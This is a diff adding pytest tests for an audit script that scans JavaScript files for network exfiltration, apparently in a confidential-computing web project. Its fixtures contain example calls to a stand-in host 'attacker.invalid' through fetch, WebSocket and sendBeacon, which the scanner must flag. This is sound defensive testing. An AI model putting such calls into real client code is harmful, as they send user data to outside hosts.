@@ -361,3 +361,41 @@ def test_k3_browser_crypto_rejects_non_pinned_kms_region_static_guard():
         "confidential-crypto.js").read_text(encoding="utf-8")
     assert "arn:aws:kms:eu-central-1:" in js
     assert "arn:aws:kms:eu-[a-z0-9-]+" not in js
+
+
+def test_k1_js_inventory_detects_explicit_network_exfiltration():
+    from scripts.audit_confidential_ai_routes import scan_js_source
+    fixture = (
+        'fetch("/api/confidential/policy")\n'
+        'fetch("https://attacker.invalid/collect")\n'
+        'new WebSocket("wss://attacker.invalid/ws")\n'
+        'navigator.sendBeacon("https://attacker.invalid", "sentinel")\n'
+    )
+    found = scan_js_source(fixture, "static/confidential-unsafe.js")
+    kinds = {hit["mechanism"] for hit in found}
+    assert {"js-network-primitive", "js-risk-absolute-fetch",
+            "js-risk-websocket", "js-risk-beacon"} <= kinds
+    assert all(set(hit) == {"file", "line", "mechanism"} for hit in found)
+
+
+def test_k1_js_inventory_allows_same_origin_confidential_auto_client():
+    from scripts.audit_confidential_ai_routes import scan_js_source
+    source = Path(__file__).with_name("static").joinpath(
+        "confidential-auto.js").read_text(encoding="utf-8")
+    found = scan_js_source(source, "static/confidential-auto.js")
+    assert any(hit["mechanism"] == "js-network-primitive" for hit in found)
+    assert not any(hit["mechanism"].startswith("js-risk-") for hit in found)
+
+
+def test_k1_js_repository_scan_fails_on_direct_external_socket(tmp_path):
+    from scripts.audit_confidential_ai_routes import scan_repo
+    confidential = tmp_path / "static"
+    confidential.mkdir()
+    (confidential / "confidential-leak.js").write_text(
+        'new WebSocket("wss://attacker.invalid");',
+        encoding="utf-8",
+    )
+    report = scan_repo(tmp_path)
+    assert report["js_files_scanned"] == 1
+    assert report["confidential_violations"]
+    assert report["zk_verified"] is False
